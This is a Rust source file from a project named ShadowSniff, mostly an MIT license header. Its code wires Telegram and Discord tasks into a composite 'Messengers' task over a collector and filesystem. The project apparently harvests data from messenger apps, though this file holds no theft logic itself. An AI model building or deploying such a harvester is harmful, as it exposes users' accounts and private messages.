/*
 * This file is part of ShadowSniff (https://github.com/sqlerrorthing/ShadowSniff)
 *
 * MIT License
 *
 * Copyright (c) 2025 sqlerrorthing
 *
 * Permission is hereby granted, free of charge, to any person obtaining a copy
 * of this software and associated documentation files (the "Software"), to deal
 * in the Software without restriction, including without limitation the rights
 * to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
 * copies of the Software, and to permit persons to whom the Software is
 * furnished to do so, subject to the following conditions:
 *
 * The above copyright notice and this permission notice shall be included in all
 * copies or substantial portions of the Software.
 *
 * THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
 * IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
 * FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
 * AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
 * LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
 * OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
 * SOFTWARE.
 */

#![no_std]
#![allow(unsafe_op_in_unsafe_fn)]

extern crate alloc;
use crate::alloc::borrow::ToOwned;
mod discord;
mod telegram;

use crate::discord::DiscordTask;
use crate::telegram::TelegramTask;
use alloc::vec;
use collector::Collector;
use filesystem::FileSystem;
use tasks::{CompositeTask, Task, composite_task, impl_composite_task_runner};

pub const VERSION: &str = env!("CARGO_PKG_VERSION");

pub struct MessengersTask<C: Collector, F: FileSystem> {
    inner: CompositeTask<C, F>,
}

impl<C: Collector, F: FileSystem> Default for MessengersTask<C, F> {
    fn default() -> Self {
        Self {
            inner: composite_task!(TelegramTask, DiscordTask),
        }
    }
}

impl_composite_task_runner!(MessengersTask<C, F>, "Messengers");
